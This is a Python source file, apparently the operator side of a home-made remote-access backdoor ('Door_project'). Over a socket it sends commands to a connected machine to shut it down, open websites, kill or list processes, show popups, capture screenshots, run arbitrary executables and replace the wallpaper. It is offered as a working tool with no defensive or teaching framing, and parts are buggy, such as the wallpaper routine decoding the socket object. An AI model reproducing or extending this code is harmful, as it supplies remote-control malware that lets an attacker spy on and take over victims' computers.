from time import sleep
import socket as ss
from PIL import Image
from pyautogui import alert
import io
from Crypto import cripto as jeff


def desligar(objj):
    try:
        objj.send(bytes("S_D", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                return dab.decode("utf-8")

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


def sit(objj, abc):
    try:
        objj.send(bytes(f"site\\{abc}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                return "Comando executado"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


def kill(objj, processo):
    try:
        objj.send(bytes(f"kill\n{processo}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return "Comando executado"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


def popup(objj, menssagem):
    try:
        send = f"popup\\{menssagem}"
        objj.send(bytes(send, "utf8"))
        send = ""
        return "Comando executado"
    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


def process(objj, name):
    try:
        objj.send(bytes(f"RP", "utf8"))
        with open(f"processos_{name}", 'w+') as txt:
            txt.write(f"Cliente {name} process\n")
            txt.write(f"{'-='*30}\n\n")
            while True:
                dab = objj.recv(1024)
                if dab:
                    proc = dab.decode("utf-8").split(",")
                    for a in proc:
                        txt.write(a)
                    txt.close()
                    return "Comando executado"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


def printt(objj, nome):
    try:
        objj.send(bytes(f"PrintS", "utf8"))
        with open('C:\\Users\\drrod\\Desktop\\all\\Creative in Python\\PyPy\\apps py\\Door_project\\Pictures\\' + nome + '.png', 'wb') as foto:
                try:
                    while True:
                        dab = objj.recv(100000)
                        if not dab:
                            alert("Comando executado")
                            break
                        foto.write(dab)

                except Exception:
                    sleep(1.5)
                    return "Photo Error"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


def expecifico(objj):
    processo = (input("Comando do Cmd ---> ") + ".exe")
    try:
        print("Enviando comando!")
        objj.send(bytes(f"expecifico\\{processo}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return "Comando executado"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


def wallpaper(objj, photo):
        try:
            objj.send(bytes("config_at_wallpaper", "utf-8"))
            while True:
                objj.recv(1024)
                if objj:
                    work = objj.decode("utf-8")
                    break
            if work:
                pass
            foto = Image.open(photo)
            f = io.BytesIO()
            foto.save(f, 'PNG')
            objj.send(bytes(f.getvalue()))
            return "Comando executado"

        except FileNotFoundError:
            sleep(1.5)
            return "File Not Found"
        except ConnectionRefusedError:
            sleep(1.5)
            return "Conection erro"
        except ConnectionAbortedError:
            sleep(1.5)
            return "Conection erro"
        except ss.error:
            sleep(1.5)
            return "Conection erro"
        except Exception:
            sleep(1.5)
            return "Error erro"



